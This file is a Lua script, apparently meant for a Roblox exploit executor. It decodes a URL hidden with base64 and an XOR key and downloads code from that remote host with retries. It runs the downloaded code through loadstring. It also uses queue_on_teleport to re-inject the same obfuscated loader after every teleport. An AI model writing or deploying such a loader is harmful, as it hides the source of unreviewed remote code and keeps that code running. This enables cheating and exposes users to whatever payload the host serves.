local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local K={0x4C,0x55,0x41,0x52,0x4F,0x43,0x4B,0x53}

local function dec(e)
	local s=e:gsub("[^"..B.."=]","")
	while #s%4~=0 do s=s.."=" end
	local o={}
	for i=1,#s,4 do
		local n1=(B:find(s:sub(i,i),1,true)or 1)-1
		local n2=(B:find(s:sub(i+1,i+1),1,true)or 1)-1
		local c,d=s:sub(i+2,i+2),s:sub(i+3,i+3)
		local n3=c~="="and((B:find(c,1,true)or 1)-1)or 0
		local n4=d~="="and((B:find(d,1,true)or 1)-1)or 0
		local v=n1*0x40000+n2*0x1000+n3*0x40+n4
		o[#o+1]=string.char(math.floor(v/0x10000)%0x100)
		if c~="="then o[#o+1]=string.char(math.floor(v/0x100)%0x100)end
		if d~="="then o[#o+1]=string.char(v%0x100)end
	end
	local r=table.concat(o)
	local x={}
	for i=1,#r do x[i]=string.char(bit32.bxor(string.byte(r,i),K[(i-1)%#K+1]))end
	return table.concat(x)
end

local LDR=dec("JCE1Ijx5ZHw/ISAgYjAoISUlNSFhICQ+YzQxO2AxPj1jOhQHJQQxOAEMECsNKT4wJx95OnwzAgkKHRAEAQUkOS8=")

local function fetch()
	local t=0
	repeat
		t=t+1
		local ok,r=pcall(game.HttpGet,game,LDR,true)
		if ok and type(r)=="string"and #r>0 then return r end
		task.wait(1.5*t)
	until t>=5
end

local function persist()
	if not queue_on_teleport then return end
	queue_on_teleport(([[
		if not game:IsLoaded()then game.Loaded:Wait()end
		task.wait(0.5)
		local B=%q
		local K={0x4C,0x55,0x41,0x52,0x4F,0x43,0x4B,0x53}
		local function dec(e)
			local s=e:gsub("[^"..B.."=]","")
			while #s%%4~=0 do s=s.."=" end
			local o={}
			for i=1,#s,4 do
				local n1=(B:find(s:sub(i,i),1,true)or 1)-1
				local n2=(B:find(s:sub(i+1,i+1),1,true)or 1)-1
				local c,d=s:sub(i+2,i+2),s:sub(i+3,i+3)
				local n3=c~="="and((B:find(c,1,true)or 1)-1)or 0
				local n4=d~="="and((B:find(d,1,true)or 1)-1)or 0
				local v=n1*0x40000+n2*0x1000+n3*0x40+n4
				o[#o+1]=string.char(math.floor(v/0x10000)%%0x100)
				if c~="="then o[#o+1]=string.char(math.floor(v/0x100)%%0x100)end
				if d~="="then o[#o+1]=string.char(v%%0x100)end
			end
			local r=table.concat(o)
			local x={}
			for i=1,#r do x[i]=string.char(bit32.bxor(string.byte(r,i),K[(i-1)%%#K+1]))end
			return table.concat(x)
		end
		local LDR=dec(%q)
		local t=0
		repeat
			t=t+1
			local ok,r=pcall(game.HttpGet,game,LDR,true)
			if ok and type(r)=="string"and #r>0 then
				local fn=loadstring(r)
				if fn then pcall(fn)end
				return
			end
			task.wait(1.5*t)
		until t>=5
	]]):format(B,"JCE1Ijx5ZHw/ISAgYjAoISUlNSFhICQ+YzQxO2AxPj1jOhQHJQQxOAEMECsNKT4wJx95OnwzAgkKHRAEAQUkOS8="))
end

task.spawn(function()
	local src=fetch()
	if not src then warn("[SS] fetch failed")return end
	local fn,err=loadstring(src)
	if not fn then warn("[SS] parse:",err)return end
	local ok,err2=pcall(fn)
	if not ok then warn("[SS] exec:",err2)end
	persist()
end)
